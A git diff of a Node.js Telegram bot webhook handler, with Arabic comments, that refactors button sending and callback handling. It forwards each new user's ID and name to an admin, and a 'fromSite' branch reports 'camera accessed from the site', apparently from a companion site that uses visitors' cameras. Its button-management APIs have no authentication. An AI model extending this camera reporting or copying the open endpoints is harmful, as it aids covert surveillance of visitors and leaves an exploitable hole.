@@ -36,7 +36,7 @@ function saveButtons(buttons) {
 }
 
 // ============================================
-// 🎬 دالة إرسال فيديو مع أزرار (مستقرة وسريعة)
+// 🎬 دالة إرسال فيديو مع أزرار (بدون رابط)
 // ============================================
 async function sendVideoWithButtons(chatId, videoUrl, caption, buttons = null) {
     try {
@@ -48,15 +48,19 @@ async function sendVideoWithButtons(chatId, videoUrl, caption, buttons = null) {
         };
 
         if (buttons && buttons.length > 0) {
-            payload.reply_markup = {
-                inline_keyboard: buttons.map(btn => [{
-                    text: btn.icon ? `${btn.icon} ${btn.text}` : btn.text,
-                    callback_data: btn.callback_data || 'noop'
-                }])
-            };
+            const inlineKeyboard = buttons.map(btn => [{
+                text: btn.icon ? `${btn.icon} ${btn.text}` : btn.text,
+                // ✅ بدون url، فقط callback_data (لن يفعل شيئاً)
+                callback_data: btn.callback_data || 'noop'
+            }]);
+            payload.reply_markup = { inline_keyboard: inlineKeyboard };
         }
 
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, payload);
+        await axios.post(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
+            payload
+        );
+
         return { success: true };
     } catch (error) {
         console.error('❌ فشل إرسال الفيديو:', error.response?.data || error.message);
@@ -65,7 +69,7 @@ async function sendVideoWithButtons(chatId, videoUrl, caption, buttons = null) {
 }
 
 // ============================================
-// 📨 دالة إرسال رسالة مع أزرار 
+// 📨 دالة إرسال رسالة مع أزرار (بدون رابط)
 // ============================================
 async function sendMessageWithButtons(chatId, text, buttons = null) {
     try {
@@ -77,18 +81,21 @@ async function sendMessageWithButtons(chatId, text, buttons = null) {
         };
 
         if (buttons && buttons.length > 0) {
-            payload.reply_markup = {
-                inline_keyboard: buttons.map(btn => [{
-                    text: btn.icon ? `${btn.icon} ${btn.text}` : btn.text,
-                    callback_data: btn.callback_data || 'noop'
-                }])
-            };
+            const inlineKeyboard = buttons.map(btn => [{
+                text: btn.icon ? `${btn.icon} ${btn.text}` : btn.text,
+                callback_data: btn.callback_data || 'noop'
+            }]);
+            payload.reply_markup = { inline_keyboard: inlineKeyboard };
         }
 
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, payload);
+        await axios.post(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            payload
+        );
+
         return { success: true };
     } catch (error) {
-        console.error('❌ فشل إرسال الرسالة:', error.response?.data || error.message);
+        console.error('❌ فشل الإرسال:', error.response?.data || error.message);
         return { success: false, error: error.message };
     }
 }
@@ -105,15 +112,22 @@ async function sendMessage(chatId, text) {
         });
         return { success: true };
     } catch (error) {
-        console.error('❌ فشل الإرسال العادي:', error.message);
+        console.error('❌ فشل الإرسال:', error.message);
         return { success: false, error: error.message };
     }
 }
 
 // ============================================
-// 📨 معالجة الـ Callback Query
+// 📨 معالجة الـ Callback Query (عند الضغط على الزر)
 // ============================================
 async function handleCallbackQuery(callbackQuery) {
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    const data = callbackQuery.data;
+
+    console.log(`🔘 ضغط على زر: ${data} من ${chatId}`);
+
+    // رد بسيط عند الضغط على الزر (تظهر رسالة منبثقة)
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
             callback_query_id: callbackQuery.id,
@@ -121,7 +135,7 @@ async function handleCallbackQuery(callbackQuery) {
             show_alert: false
         });
     } catch (error) {
-        console.error('❌ فشل الرد على الـ Callback:', error.message);
+        console.error('❌ فشل الرد على الضغط:', error.message);
     }
 }
 
@@ -244,84 +258,98 @@ async function handleAdminCommands(chatId, text) {
 }
 
 // ============================================
-// 🌐 المعالج الرئيسي لويندوز و Vercel
+// 🌐 المعالج الرئيسي
 // ============================================
 module.exports = async (req, res) => {
-    try {
-        res.setHeader('Access-Control-Allow-Origin', '*');
-        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-        if (req.method === 'OPTIONS') {
-            return res.status(200).end();
-        }
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
 
-        // [APIs لـ لوحة التحكم]
-        if (req.method === 'GET' && req.url === '/api/buttons') {
-            return res.status(200).json({ success: true, buttons: loadButtons() });
-        }
-        if (req.method === 'POST' && req.url === '/api/buttons/add') {
-            const { text, url, icon } = req.body;
-            const buttons = loadButtons();
-            const newButton = { 
-                id: `btn_${Date.now()}`, 
-                text: text.trim(), 
-                url: url.trim(), 
-                icon: icon?.trim() || '🔗',
-                callback_data: `btn_${Date.now()}`
-            };
-            buttons.push(newButton); 
-            saveButtons(buttons);
-            return res.status(200).json({ success: true, button: newButton });
-        }
-        if (req.method === 'PUT' && req.url.startsWith('/api/buttons/edit/')) {
-            const id = req.url.split('/').pop(); 
-            const { text, url, icon } = req.body;
-            let buttons = loadButtons(); 
-            const index = buttons.findIndex(b => b.id === id);
-            if (index === -1) return res.status(404).json({ success: false });
-            buttons[index].text = text || buttons[index].text; 
-            buttons[index].url = url || buttons[index].url; 
-            buttons[index].icon = icon || buttons[index].icon;
-            saveButtons(buttons); 
-            return res.status(200).json({ success: true });
-        }
-        if (req.method === 'DELETE' && req.url.startsWith('/api/buttons/delete/')) {
-            const id = req.url.split('/').pop(); 
-            let buttons = loadButtons(); 
-            const filtered = buttons.filter(b => b.id !== id);
-            saveButtons(filtered); 
-            return res.status(200).json({ success: true });
-        }
+    // [APIs لـ لوحة التحكم]
+    if (req.method === 'GET' && req.url === '/api/buttons') {
+        return res.status(200).json({ success: true, buttons: loadButtons() });
+    }
+    if (req.method === 'POST' && req.url === '/api/buttons/add') {
+        const { text, url, icon } = req.body;
+        const buttons = loadButtons();
+        const newButton = { 
+            id: `btn_${Date.now()}`, 
+            text: text.trim(), 
+            url: url.trim(), 
+            icon: icon?.trim() || '🔗',
+            callback_data: `btn_${Date.now()}`
+        };
+        buttons.push(newButton); 
+        saveButtons(buttons);
+        return res.status(200).json({ success: true, button: newButton });
+    }
+    if (req.method === 'PUT' && req.url.startsWith('/api/buttons/edit/')) {
+        const id = req.url.split('/').pop(); 
+        const { text, url, icon } = req.body;
+        let buttons = loadButtons(); 
+        const index = buttons.findIndex(b => b.id === id);
+        if (index === -1) return res.status(404).json({ success: false });
+        buttons[index].text = text || buttons[index].text; 
+        buttons[index].url = url || buttons[index].url; 
+        buttons[index].icon = icon || buttons[index].icon;
+        saveButtons(buttons); 
+        return res.status(200).json({ success: true });
+    }
+    if (req.method === 'DELETE' && req.url.startsWith('/api/buttons/delete/')) {
+        const id = req.url.split('/').pop(); 
+        let buttons = loadButtons(); 
+        const filtered = buttons.filter(b => b.id !== id);
+        saveButtons(filtered); 
+        return res.status(200).json({ success: true });
+    }
 
-        // ============================================
-        // 🤖 Webhook من تليجرام (POST)
-        // ============================================
-        if (req.method === 'POST') {
+    // ============================================
+    // 🤖 Webhook من تليجرام (POST)
+    // ============================================
+    if (req.method === 'POST') {
+        try {
             const update = req.body;
-            if (!update) return res.status(200).json({ ok: true });
 
+            // ==========================================
+            // معالجة الـ Callback Query (الضغط على الزر)
+            // ==========================================
             if (update.callback_query) {
                 await handleCallbackQuery(update.callback_query);
                 return res.status(200).json({ ok: true });
             }
 
+            // ==========================================
+            // معالجة الرسائل
+            // ==========================================
             if (update.message) {
                 const message = update.message;
                 const chatId = message.chat.id;
                 const text = message.text || '';
                 const firstName = message.from?.first_name || 'مستخدم';
 
-                // 1️⃣ أمر /start
+                // ==========================================
+                // 1️⃣ أمر /start 
+                // ==========================================
                 if (text === '/start') {
                     const videoUrl = 'https://od.lk/s/M18zMzA4NzgzNDNf/%40VideoToGifConverterBot.mp4';
-                    const welcomeText = `🎉 **مرحباً بك في البوت!**\n\n👤 الاسم: ${firstName}\n🆔 المعرف: ${chatId}`;
+                    
+                    const welcomeText = `
+🎉 **مرحباً بك في البوت!**
 
+👤 الاسم: ${firstName}
+🆔 المعرف: ${chatId}
+                    `;
+
+                    // 🔵 الزر المطلوب - بدون رابط، فقط كلام، لون أزرق (تلقائياً)
                     const customButtons = [
                         {
                             id: 'btn_warning',
-                            text: 'تم إيقاف البوت الإباحي',
-                            icon: '⚠️', 
+                            text: '⚠️ تم إيقاف البوت الإباحي',
+                            icon: '🔵', // إيموجي أزرق للإشارة
                             callback_data: 'warning_clicked'
                         }
                     ];
@@ -329,38 +357,56 @@ module.exports = async (req, res) => {
                     await sendVideoWithButtons(chatId, videoUrl, welcomeText, customButtons);
 
                     if (CHAT_ID && chatId.toString() !== CHAT_ID.toString()) {
-                        await sendMessage(CHAT_ID, `👤 **مستخدم جديد ضغط /start**\n🆔 ID: ${chatId}\n📝 الاسم: ${firstName}`);
+                        await sendMessage(
+                            CHAT_ID,
+                            `👤 **مستخدم جديد ضغط /start**\n🆔 ID: ${chatId}\n📝 الاسم: ${firstName}`
+                        );
                     }
+
                     return res.status(200).json({ ok: true });
                 }
 
+                // ==========================================
                 // 2️⃣ أوامر المطور
+                // ==========================================
                 if (chatId.toString() === CHAT_ID?.toString()) {
                     const handled = await handleAdminCommands(chatId, text);
-                    if (handled) return res.status(200).json({ ok: true });
+                    if (handled) {
+                        return res.status(200).json({ ok: true });
+                    }
                 }
 
+                // ==========================================
                 // 3️⃣ أي رسالة أخرى
+                // ==========================================
                 const defaultButtons = loadButtons();
-                await sendMessageWithButtons(chatId, `👋 مرحباً بك!\n🆘 للمساعدة وبدء تشغيل البوت مجدداً اكتب /start`, defaultButtons);
+                await sendMessageWithButtons(chatId, `
+👋 مرحباً بك!
+🆘 للمساعدة وبدء تشغيل البوت مجدداً اكتب /start
+                `, defaultButtons);
             }
 
+            // ==========================================
+            // 4️⃣ طلب من الموقع
+            // ==========================================
             if (req.body.fromSite) {
-                if (CHAT_ID) await sendMessage(CHAT_ID, `📸 **تم الوصول للكاميرا من الموقع!**`);
+                if (CHAT_ID) {
+                    await sendMessage(CHAT_ID, `📸 **تم الوصول للكاميرا من الموقع!**`);
+                }
                 return res.status(200).json({ success: true });
             }
 
             return res.status(200).json({ ok: true });
+
+        } catch (error) {
+            console.error('❌ خطأ في معالجة Webhook:', error);
+            return res.status(200).json({ ok: false, error: error.message });
         }
-
-        if (req.method === 'GET') {
-            return res.status(200).json({ status: '✅ البوت يعمل!', buttons: loadButtons().length });
-        }
-
-        return res.status(405).json({ error: 'Method Not Allowed' });
-
-    } catch (globalError) {
-        console.error('🔥 خطأ فادح:', globalError.message);
-        return res.status(200).json({ ok: false, error: globalError.message });
     }
+
+    if (req.method === 'GET') {
+        return res.status(200).json({ status: '✅ البوت يعمل!', buttons: loadButtons().length });
+    }
+
+    return res.status(405).json({ error: 'Method Not Allowed' });
 };
